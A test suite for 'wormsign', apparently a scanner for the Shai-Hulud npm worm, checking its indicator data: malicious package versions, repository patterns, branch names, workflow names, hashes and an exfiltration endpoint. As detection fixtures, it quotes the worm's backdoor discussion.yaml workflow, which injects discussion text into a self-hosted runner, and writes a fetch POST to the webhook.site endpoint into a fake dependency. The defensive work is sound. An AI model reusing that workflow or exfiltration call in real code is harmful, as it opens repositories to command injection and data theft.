import { test } from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { cpSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { matchRepoPattern } from "../src/audit-org.js";
import { makeContext } from "../src/checks/context.js";
import { candidateNames } from "../src/checks/files.js";
import { checkWorkflow } from "../src/checks/workflows.js";
import { bundledIocDir, indexPackages, loadIocDir } from "../src/iocs.js";
import { scanDirectory } from "../src/scan.js";

const repoRoot = fileURLToPath(new URL("../../", import.meta.url));
const iocs = () => loadIocDir(bundledIocDir);
const ctx = () => makeContext(iocs());
const setSize = (id: string): [number, number] => {
  const s = iocs().packageSets.find((p) => p.id === id);
  assert.ok(s, id);
  return [Object.keys(s.packages).length, Object.values(s.packages).reduce((n, v) => n + v.length, 0)];
};

/* ---- package sets: licensed data, selected by the vendor reports they cite (scripts/import-package-sets.mjs) ---- */
type RawSet = { id: string; wave: string; source: string; retrieved?: string; note?: string; packages: Record<string, string[]>; records?: Record<string, string[]>; unmatched?: Record<string, string[]>; dataset?: { name: string; url: string; commit: string; path: string; license: string } };
const rawSets = () => (JSON.parse(readFileSync(join(bundledIocDir, "packages.json"), "utf8")) as { sets: RawSet[] }).sets;
const DATASETS: Record<string, string> = { "https://github.com/DataDog/indicators-of-compromise": "datadog", "https://github.com/ossf/malicious-packages": "openssf" };

test("every package set comes from an Apache-2.0 dataset pinned to a commit and attributed in THIRD_PARTY_NOTICES.md", () => {
  const notices = readFileSync(join(repoRoot, "THIRD_PARTY_NOTICES.md"), "utf8");
  for (const s of rawSets()) {
    const d = s.dataset;
    assert.ok(d, `${s.id} names no dataset`);
    assert.equal(d.license, "Apache-2.0", s.id);
    assert.ok(DATASETS[d.url], `${s.id}: ${d.url} is not one of the licensed datasets`);
    assert.match(d.commit, /^[0-9a-f]{40}$/, s.id);
    assert.ok(notices.includes(`${d.url}/tree/${d.commit}`), `${s.id}: THIRD_PARTY_NOTICES.md does not link ${d.url} at ${d.commit}`);
    assert.ok(notices.includes(`\`${s.id}\``), `${s.id} is not named in THIRD_PARTY_NOTICES.md`);
  }
  // The unlicensed list this data used to carry must not come back.
  assert.doesNotMatch(readFileSync(join(bundledIocDir, "packages.json"), "utf8"), /wiz-research-iocs/);
});
test("the Apache-2.0 text ships unmodified, with the notices, in the npm package", () => {
  const text = readFileSync(join(bundledIocDir, "LICENSES", "Apache-2.0.txt"));
  // SHA-256 of https://www.apache.org/licenses/LICENSE-2.0.txt as fetched on 2026-10-02.
  assert.equal(createHash("sha256").update(text).digest("hex"), "cfc7749b96f63bd31c3c42b5c471bf756814053e847c10f3eb003417bc523d30");
  const files = (JSON.parse(readFileSync(join(repoRoot, "package.json"), "utf8")) as { files: string[] }).files;
  assert.ok(files.includes("THIRD_PARTY_NOTICES.md"), "package.json files must ship the notices");
  assert.ok(files.includes("data"), "package.json files must ship data/, which holds data/iocs/LICENSES");
});
test("2025-11: Datadog's consolidated list is imported whole, cited by its pinned blob URL", () => {
  const s = rawSets().find((x) => x.id === "datadog-shai-hulud-2.0");
  assert.ok(s?.dataset);
  assert.equal(s.source, `https://github.com/DataDog/indicators-of-compromise/blob/${s.dataset.commit}/shai-hulud-2.0/consolidated_iocs.csv`);
  assert.deepEqual(setSize(s.id), [795, 1091], "795 rows; versions split out of each row's package_versions field");
  const idx = indexPackages(iocs().packageSets);
  assert.match(idx.lookup("02-echo", "0.0.7") ?? "", /consolidated_iocs\.csv$/);
  assert.ok(idx.lookup("@dev-blinq/cucumber_client", "1.0.1637-dev"), "a pre-release version from a quoted multi-version field");
});
test("OpenSSF sets: each package names the OpenSSF records it came from, and no version is both loaded and unmatched", () => {
  for (const s of rawSets().filter((x) => x.dataset?.url === "https://github.com/ossf/malicious-packages")) {
    assert.deepEqual(Object.keys(s.records ?? {}), Object.keys(s.packages), `${s.id}: one records entry per package`);
    for (const ids of Object.values(s.records ?? {})) for (const id of ids) assert.match(id, /^MAL-\d{4}-\d+$/, s.id);
    for (const [n, vs] of Object.entries(s.unmatched ?? {})) for (const v of vs) assert.ok(!s.packages[n]?.includes(v), `${s.id}: ${n}@${v} is both loaded and unmatched`);
  }
});
test("2025-09: StepSecurity's table and Socket's list select OpenSSF records; the one version no record lists is not loaded", () => {
  const idx = indexPackages(iocs().packageSets);
  assert.match(idx.lookup("@crowdstrike/commitlint", "8.1.1") ?? "", /stepsecurity/);
  assert.ok(idx.lookup("ngx-bootstrap", "18.1.4"));
  assert.ok(idx.lookup("@art-ws/common", "2.0.28"));
  assert.match(idx.lookup("@operato/board", "9.0.35") ?? "", /socket\.dev/, "listed only by Socket");
  // Row 59 of the saved StepSecurity page has a malformed cell; its versions must still be read.
  assert.ok(idx.lookup("@nativescript-community/ui-label", "1.3.37"));
  assert.deepEqual(setSize("openssf-shai-hulud-1-stepsecurity"), [195, 484], "all 195 rows / 484 versions on the page have a record");
  assert.deepEqual(setSize("openssf-shai-hulud-1-socket"), [197, 525], "page: 'Total packages: 526', one without a record");
  assert.equal(rawSets().find((s) => s.id === "openssf-shai-hulud-1-stepsecurity")?.records?.["@ctrl/tinycolor"]?.[0], "MAL-2025-47141");
  // A fork published 2025-08-31, two weeks before the worm's ember-velcro 2.2.1, judged a false positive in
  // docs/iocs.md; no OpenSSF record lists it either, so it is recorded as unmatched and never loaded.
  assert.deepEqual(rawSets().find((s) => s.id === "openssf-shai-hulud-1-socket")?.unmatched, { "@teriyakibomb/ember-velcro": ["2.2.1"] });
  assert.equal(idx.lookup("@teriyakibomb/ember-velcro", "2.2.1"), undefined);
  assert.ok(idx.lookup("ember-velcro", "2.2.1"), "the worm's own ember-velcro 2.2.1 is still flagged");
  // Kept although published in March and May 2025, before the wave: GitHub's malware advisory GHSA-88g6-qjxg-cg72
  // (OSV MAL-2025-47455) names exactly these two versions, and npm has removed them.
  for (const v of ["19.0.3", "19.0.4"]) assert.ok(idx.lookup("@rxap/ngx-bootstrap", v), v);
});
test("April 2026: the four packages Picus names for the first Mini Shai-Hulud wave", () => {
  const idx = indexPackages(iocs().packageSets);
  for (const [n, v] of [["@cap-js/sqlite", "2.2.2"], ["@cap-js/postgres", "2.2.2"], ["@cap-js/db-service", "2.10.1"], ["mbt", "1.2.48"]] as const) {
    assert.match(idx.lookup(n, v) ?? "", /picussecurity/, `${n}@${v}`);
  }
  assert.deepEqual(setSize("openssf-mini-shai-hulud-picus"), [4, 4]);
});
test("May 2026: StepSecurity's Mini Shai-Hulud table (TanStack and others) selects OpenSSF records", () => {
  const idx = indexPackages(iocs().packageSets);
  for (const [n, v] of [["@tanstack/react-router", "1.169.5"], ["@tanstack/react-router", "1.169.8"], ["@mistralai/mistralai", "2.2.3"], ["@uipath/agent.sdk", "0.0.18"], ["@squawk/airways", "0.4.5"]] as const) {
    assert.match(idx.lookup(n, v) ?? "", /stepsecurity\.io\/blog\/mini-shai-hulud-is-back/, `${n}@${v}`);
  }
  const s = rawSets().find((x) => x.id === "openssf-mini-shai-hulud-may-2026-stepsecurity");
  assert.equal(s?.wave, "2026-05");
  assert.deepEqual(setSize("openssf-mini-shai-hulud-may-2026-stepsecurity"), [170, 344], "172 rows, two of them PyPI; every listed npm version has a record");
  assert.equal(Object.keys(s?.packages ?? {}).filter((n) => n.startsWith("@tanstack/")).length, 42, "the page: '84 malicious versions across 42 @tanstack/* packages'");
  assert.deepEqual(s?.records?.["@tanstack/react-router"], ["MAL-2026-3465"]);
  assert.deepEqual(s?.unmatched, {});
  assert.equal(idx.lookup("mistralai", "2.4.6"), undefined, "the PyPI row is not an npm entry");
});
test("August 2026: the npm rows of JFrog's table select OpenSSF records (page: 400+ packages, 1700+ versions)", () => {
  const idx = indexPackages(iocs().packageSets);
  for (const [n, v] of [["keyv", "6.0.0"], ["cacheable", "2.5.1"], ["flat-cache", "6.1.24"], ["cache-manager", "7.2.10"], ["@cacheable/memory", "2.2.1"]] as const) {
    assert.match(idx.lookup(n, v) ?? "", /jfrog/, `${n}@${v}`);
  }
  assert.deepEqual(setSize("openssf-shai-hulud-aug-2026-jfrog"), [463, 1738]);
  assert.equal(idx.lookup("github.com/jaredwray/keyv", "v6.0.1+incompatible"), undefined, "Go module rows are not npm");
});
test("every package set names its source and retrieved date, and no note claims a list is missing", () => {
  for (const s of rawSets()) {
    assert.match(s.retrieved ?? "", /^\d{4}-\d{2}-\d{2}$/, s.id);
    assert.doesNotMatch(s.note ?? "", /exemplar|only the one version|no machine-readable/i, s.id);
  }
});

/* ---- repository patterns ---- */
const matching = (repo: { name: string; description: string | null }) => iocs().repoPatterns.filter((p) => matchRepoPattern(p, repo)).map((p) => p.id);
test("'Shai-Hulud Migration' is matched as a description: GitHub repository names cannot contain spaces", () => {
  assert.deepEqual(matching({ name: "Test-Repo-Depot", description: "Shai-Hulud Migration" }), ["sh1-migration"]);
  assert.deepEqual(matching({ name: "shai-hulud-migration-response", description: "Shai-Hulud Migration Response" }), [], "a responder's repo is not the IOC");
});
test("wave 2: 'The Continued Coming' is matched, and a 'Second Coming' repo is reported once", () => {
  assert.deepEqual(matching({ name: "web-app", description: "Sha1-Hulud: The Continued Coming" }), ["sh2-continued"]);
  assert.deepEqual(matching({ name: "macjp3ztzbn79c68zi", description: "Sha1-Hulud: The Second Coming." }), ["sh2-description"]);
});

/* ---- branches: names ending in "*" are prefixes (audit-org matches them with startsWith) ---- */
test("the three sourced branch IOCs are present, Wiz's as a prefix of add-linter-workflow-{Date.now()}", () => {
  assert.deepEqual(iocs().branches.map((b) => `${b.wave} ${b.name}`), ["2025-09 shai-hulud", "2025-11 add-linter-workflow-*", "2026-08 dependabot/github_actions/format/setup-formatter"]);
});

/* ---- workflow file names ---- */
const benignWorkflow = "name: ci\non: push\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n";
// Verbatim from Wiz (the worm's PUT of .github/workflows/discussion.yaml).
const wormDiscussion = "\nname: Discussion Create\non:\n  discussion:\njobs:\n  process:\n    env:\n      RUNNER_TRACKING_ID: 0\n    runs-on: self-hosted\n    steps:\n      - uses: actions/checkout@v5\n      - name: Handle Discussion\n        run: echo ${{ github.event.discussion.body }}\n";
test("the worm's real discussion.yaml fails the default --fail-on high gate", () => {
  const sev = checkWorkflow(".github/workflows/discussion.yaml", wormDiscussion, ctx()).map((f) => f.severity);
  assert.ok(sev.includes("critical") || sev.includes("high"), sev.join(", "));
});
test("Socket's shai-hulud.yaml is a workflow IOC", () => {
  const f = checkWorkflow(".github/workflows/shai-hulud.yaml", benignWorkflow, ctx());
  assert.ok(f.some((x) => x.ruleId === "WS-GH-001" && x.severity === "high"));
});

/* ---- payload file names decide what a default scan hashes ---- */
test("the JFrog workflow hash is named, so a default scan hashes codeql_analysis.yml", () => {
  assert.ok(candidateNames(ctx()).has("codeql_analysis.yml"), "JFrog names the injected workflow .github/workflows/codeql_analysis.yml");
  assert.equal(iocs().hashes.find((h) => h.sha256.startsWith("3f3f42d0"))?.name, "codeql_analysis.yml");
});
test("hash names are basenames, except a parenthesised label for a sample with no published name", () => {
  for (const h of iocs().hashes) assert.match(h.name, /^\([a-z ]+\)$|^[^/()\s]+$/, h.sha256);
});

/* ---- wormsign's own data must not match itself ---- */
const ENDPOINT = "webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7";
test("endpoint IOCs are stored defanged and refanged by the loader", () => {
  for (const f of readdirSync(bundledIocDir).filter((x) => x.endsWith(".json"))) assert.ok(!readFileSync(join(bundledIocDir, f), "utf8").includes(ENDPOINT), f);
  assert.ok(iocs().endpoints.some((e) => e.substring === ENDPOINT));
});
test("deep scan of a project with wormsign installed: its data files raise nothing, a real endpoint still does", () => {
  const root = mkdtempSync(join(tmpdir(), "ws-self-"));
  writeFileSync(join(root, "package.json"), JSON.stringify({ name: "app", version: "1.0.0" }));
  const pkg = join(root, "node_modules", "wormsign");
  mkdirSync(pkg, { recursive: true });
  cpSync(join(repoRoot, "package.json"), join(pkg, "package.json"));
  cpSync(bundledIocDir, join(pkg, "data", "iocs"), { recursive: true });
  // Positive control: the same endpoint in another dependency's code is still caught.
  mkdirSync(join(root, "node_modules", "evil"), { recursive: true });
  writeFileSync(join(root, "node_modules", "evil", "package.json"), JSON.stringify({ name: "evil", version: "1.0.0" }));
  writeFileSync(join(root, "node_modules", "evil", "index.js"), `fetch("https://${ENDPOINT}", { method: "POST" });\n`);

  const res = scanDirectory(root, ctx(), { nodeModules: true });
  assert.deepEqual(res.findings.filter((f) => f.file?.startsWith("node_modules/wormsign/")), []);
  assert.deepEqual(res.findings.filter((f) => f.severity === "critical").map((f) => `${f.ruleId} ${f.file}`), ["WS-EX-002 node_modules/evil/index.js"]);
});
test("docs/iocs.md states the shipped counts, including in its recorded update-iocs output", () => {
  // The page's numbers are hand-copied from runs; this catches a refresh that changes the data but not the page.
  const doc = readFileSync(join(repoRoot, "docs", "iocs.md"), "utf8");
  const d = iocs();
  const entries = d.packageSets.reduce((a, s) => a + Object.values(s.packages).reduce((b, v) => b + v.length, 0), 0);
  const names = new Set(d.packageSets.flatMap((s) => Object.keys(s.packages)));
  const distinct = new Set(d.packageSets.flatMap((s) => Object.entries(s.packages).flatMap(([n, vs]) => vs.map((v) => `${n}@${v}`))));
  const fmt = (n: number) => n.toLocaleString("en-US");
  assert.ok(doc.includes(`${fmt(entries)} entries across the sets; ${fmt(distinct.size)} distinct versions of ${fmt(names.size)} names`), "the packages.json row of the table");
  // src/main.ts prints the sum over the sets, so this is what update-iocs prints for a copy of the bundled data.
  const printed = doc.match(/IOC cache updated: (\d+) package versions, (\d+) hashes, (\d+) workflow names/);
  assert.ok(printed, "the recorded update-iocs output");
  assert.deepEqual(printed.slice(1).map(Number), [entries, d.hashes.length, d.workflowFiles.length]);
});
